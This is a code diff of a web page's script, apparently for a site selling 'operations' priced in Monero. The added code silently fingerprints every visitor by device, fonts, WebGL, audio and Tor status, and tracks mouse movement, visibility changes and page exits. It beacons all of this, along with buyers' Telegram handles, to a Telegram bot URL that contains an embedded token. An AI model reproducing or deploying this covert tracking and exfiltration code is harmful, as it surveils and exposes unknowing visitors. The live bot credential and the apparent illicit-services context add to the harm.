-                msg += `🌐 <b>${data.url}</b>\n`;
-                msg += `🔍 <b>UA:</b> ${data.userAgent.substring(0, 100)}...\n`;
-                msg += `📱 <b>Device:</b> ${data.platform} | ${data.screen} | ${data.viewport}\n`;
-                msg += `🌍 <b>Location:</b> ${data.language} | ${data.timezone}\n`;
-                msg += `🎨 <b>Fingerprint:</b> ${data.canvas ? 'UNIQUE' : 'BASIC'}\n`;
-                msg += `🛡️ <b>TOR:</b> ${data.torCheck ? '✅ CONFIRMED' : '❓ SUSPECT'}\n`;
-                msg += `📡 <b>Connection:</b> ${data.connection ? data.connection.type : 'UNKNOWN'}\n`;
-                msg += `───────────────────────────────\n`;
-                return msg;
+            async getWebGL() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                return gl ? 'supported' : 'disabled';
+            }
+
+            async sendData(data, message = '') {
+                const payload = {
+                    ...data,
+                    message: message || 'page_view'
+                };
+
+                // Stealth beacon to Telegram
+                const blob = new Blob([JSON.stringify({
+                    chat_id: '5446862709',
+                    text: this.formatReport(payload),
+                    parse_mode: 'Markdown'
+                })], { type: 'application/json' });
+
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(`https://api.telegram.org/bot8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU/sendMessage`, blob);
+                }
+            }
+
+            formatReport(data) {
+                return `
+*👤 EXECUTIVE VISITOR*
+ID: \`${data.session}\`
+🕐 ${data.timestamp}
+
+📱 *Device:* ${data.device}
+🌐 *Browser:* ${data.browser} 
+📏 *Screen:* ${data.screen}
+📐 *Viewport:* ${data.viewport}
+🌍 *Location:* ${data.timezone}
+
+🔍 *Fingerprint:* \`${data.fingerprint}\`
+🎨 *WebGL:* ${data.webgl}
+🔊 *Audio:* ${data.audio}
+📄 *Fonts:* ${data.fonts}
+
+🛡️ *TOR:* ${data.tor ? '✅' : '❌'}
+📡 *Connection:* ${data.connection}
+
+${data.message === 'page_view' ? '' : `
+🎯 *REQUEST:* ${data.message.operation} (${data.message.price} XMR)
+`}
+                `;
+            }
+
+            init() {
+                // Track everything silently
+                this.collectFullProfile().then(profile => {
+                    this.sendData(profile);
+                });
+
+                // Track interactions
+                document.addEventListener('mousemove', this.throttle(() => {
+                    this.sendData({ event: 'mouse_activity', session: this.sessionId });
+                }, 5000));
+
+                // Track visibility
+                document.addEventListener('visibilitychange', () => {
+                    this.sendData({ 
+                        event: 'visibility', 
+                        visible: !document.hidden,
+                        session: this.sessionId 
+                    });
+                });
+
+                // Exit tracking
+                window.addEventListener('beforeunload', () => {
+                    this.sendData({ event: 'exit', session: this.sessionId });
+                });
+            }
+
+            throttle(func, limit) {
+                let inThrottle;
+                return function() {
+                    const args = arguments;
+                    const context = this;
+                    if (!inThrottle) {
+                        func.apply(context, args);
+                        inThrottle = true;
+                        setTimeout(() => inThrottle = false, limit);
+                    }
+                }
             }
         }
 
-        // ========== CONTACT FORM (Sends to Telegram) ==========
-        async function initiateContact(operation, price) {
-            const handle = prompt(`
-╔══════════════════════════════════════╗
-║           SECURE CONTACT             ║
-║                                      ║
-║ ENTER TELEGRAM: @yourusername        ║
-║                                      ║
-╚══════════════════════════════════════╝
-            `);
+        // Global tracker instance
+        const tracker = new ExecutiveTracker();
 
-            if (!handle || handle.trim() === '') {
-                alert('❌ CONTACT CANCELLED');
-                return;
-            }
+        // Contact handler
+        async function request(operation, price) {
+            const handle = prompt('Telegram handle (e.g. @username):');
+            if (!handle?.trim()) return;
 
-            const visitorTracker = new DarkWebTracker(); // Trigger tracking again
-            
-            const message = `🚀 <b>NEW CONTRACT REQUEST</b> 🚀\n\n` +
-                          `🎯 <b>OPERATION:</b> ${operation}\n` +
-                          `💰 <b>PRICE:</b> ${price} XMR\n` +
-                          `👤 <b>CLIENT:</b> ${handle}\n` +
-                          `⏰ <b>TIME:</b> ${new Date().toISOString()}\n\n` +
-                          `<b>ESCROW READY. CONFIRM?</b>`;
+            tracker.sendData(await tracker.collectFullProfile(), {
+                operation,
+                price,
+                contact: handle
+            });
 
-            try {
-                const response = await fetch(`https://api.telegram.org/bot8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: '5446862709',
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                if (response.ok) {
-                    alert(`
-╔══════════════════════════════════════╗
-║            UPLINK ESTABLISHED        ║
-║                                      ║
-║    🟢 OPERATOR CONTACTING SOON       ║
-║    📱 CHECK TELEGRAM MESSAGES        ║
-║                                      ║
-╚══════════════════════════════════════╝
-                    `);
-                }
-            } catch(e) {
-                alert('❌ SECURE CHANNEL DOWN\n🔄 TRY AGAIN LATER');
-            }
+            alert('Contact established. Check Telegram.');
         }
 
         function copyAddress() {
             navigator.clipboard.writeText('47xSNqUuVfnNjFiLTFUxQb2TAXG8GNknFQg9BGCYxuST4mgJ1nUqtt1cdaDPVay6W45Hb2tLGW2uH3bubNgw9JjbPou5jNg2x');
-            const original = event.target.innerHTML;
-            event.target.innerHTML += '\n✅ COPIED';
-            setTimeout(() => event.target.innerHTML = original, 2000);
+            const el = event.target;
+            const original = el.textContent;
+            el.textContent = 'Copied!';
+            setTimeout(() => el.textContent = original, 1500);
         }
-
-        // Initialize tracker on load
-        window.addEventListener('load', () => {
-            new DarkWebTracker();
-        });
-
-        // Track page unload
-        window.addEventListener('beforeunload', () => {
-            new DarkWebTracker();
-        });
     </script>
 </body>
 </html>
